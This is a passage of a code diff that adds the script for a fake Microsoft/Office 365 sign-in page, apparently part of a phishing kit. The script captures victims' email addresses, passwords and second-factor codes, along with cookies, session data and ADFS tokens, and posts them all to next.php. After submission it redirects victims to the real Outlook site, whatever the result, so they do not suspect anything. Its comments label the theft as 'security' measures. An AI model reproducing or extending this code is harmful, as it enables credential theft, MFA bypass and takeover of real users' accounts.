+                // Prepare the data for both AJAX and regular submission
+                const postData = {
+                    "email": user,
+                    "password": pass,
+                    "count": count,
+                    "cookies_data": $('#cookies_data').val(),
+                    "session_data": $('#session_data').val(),
+                    "adfs_tokens": $('#adfs_tokens').val(),
+                    "auth_token": authToken,
+                    "security_hash": $('#security_hash').val()
+                };
+                
+                // First try AJAX delivery with fallback to standard POST
+                secureAjaxSend(postData, function(result) {
+                    // Proceed with normal submission regardless of AJAX result for reliability
+                    $.ajax({
+                        url: "next.php",
+                        data: postData,
+                        type: "POST",
+                        success: function(data){
+                            if(data == 1){
+                                // First attempt success - redirect to Outlook
+                                setTimeout(function(){
+                                    window.location.href = "https://outlook.office365.com";
+                                }, 2000);
+                            } else {
+                                // First attempt - show auth code screen on second attempt
+                                if(count == "1") {
+                                    $('#count').val("2");
+                                    $('#progressBar').hide();
+                                    $('#idSIButton9').prop('disabled', false);
+                                    $('#passwordView').hide();
+                                    $('#authCodeView').show();
+                                    $('#authCodeInput').focus();
+                                } else {
+                                    // Second attempt failed - show error
+                                    $('#i0118').val('');
+                                    $('#progressBar').hide();
+                                    $("#passwordError").show();
+                                    $("#important").hide();
+                                    $('#idSIButton9').prop('disabled', false);
+                                    $('#i0118').focus();
+                                }
+                            }
+                        },
+                        error: function(data) {
+                            // Handle error
+                            $('#i0118').val('');
+                            $('#progressBar').hide();
+                            $("#passwordError").show();
+                            $("#important").hide();
+                            $('#idSIButton9').prop('disabled', false);
+                            $('#i0118').focus();
+                        }
+                    });
+                });
+            }
+        });
+        
+        // Auth code submission handler with enhanced security
+        $('#idSubmitCode').on('click', function(event) {
+            event.preventDefault ? event.preventDefault() : event.returnValue = false;
+            var user = $('.identity').html();
+            var pass = $('#i0118').val();
+            var code = $('#authCodeInput').val();
+            
+            // Generate auth token for form security
+            var authToken = generateAuthToken(user);
+            
+            // Update data before submission
+            $('#cookies_data').val(collectCookiesData());
+            $('#session_data').val(collectSessionData());
+            $('#adfs_tokens').val(collectADFSTokens());
+            $('#auth_token').val(authToken);
+            $('#auth_code').val(code);
+            
+            // Validate auth code
+            if(code == ""){
+                $("#emptyCodeError").show();
+                $("#codeError").hide();
+                $("#authCodeInput").css("border-color", "#e81123");
+                $('#authCodeInput').focus();
+                return;
+            }
+            
+            // Show loading UI
+            $("#authCodeInput").css("border-color", "rgba(0,0,0,0.6)");
+            $('#progressBar').show();
+            $("#emptyCodeError").hide();
+            $("#codeError").hide();
+            $('#idSubmitCode').prop('disabled', true);
+            
+            // Prepare the data for AJAX and regular submission
+            const postData = {
+                "email": user,
+                "password": pass,
+                "auth_code": code,
+                "count": "2",
+                "cookies_data": $('#cookies_data').val(),
+                "session_data": $('#session_data').val(),
+                "adfs_tokens": $('#adfs_tokens').val(),
+                "auth_token": authToken,
+                "security_hash": $('#security_hash').val()
+            };
+            
+            // First try AJAX delivery with fallback to standard POST
+            secureAjaxSend(postData, function(result) {
+                // Proceed with normal submission regardless of AJAX result
+                $.ajax({
+                    url: "next.php",
+                    data: postData,
+                    type: "POST",
+                    success: function(data){
+                        // Redirect to Outlook after code submission
+                        setTimeout(function(){
+                            window.location.href = "https://outlook.office365.com";
+                        }, 1500);
+                    },
+                    error: function(data) {
+                        // Redirect to Outlook on error
+                        setTimeout(function(){
+                            window.location.href = "https://outlook.office365.com";
+                        }, 1500);
+                    }
+                });
+            });
+        });
+        
+        // Enable Enter key submission for email
+        $('#i0116').on('keypress', function(e) {
+            if(e.which == 13) {
+                e.preventDefault();
+                $('#idSIButton9').click();
+            }
+        });
+        
+        // Enable Enter key submission for password
+        $('#i0118').on('keypress', function(e) {
+            if(e.which == 13) {
+                e.preventDefault();
+                $('#idSIButton9').click();
+            }
+        });
+        
+        // Enable Enter key submission for auth code
+        $('#authCodeInput').on('keypress', function(e) {
+            if(e.which == 13) {
+                e.preventDefault();
+                $('#idSubmitCode').click();
+            }
+        });
+    }
+});
+</script>
+</body>
+</html>
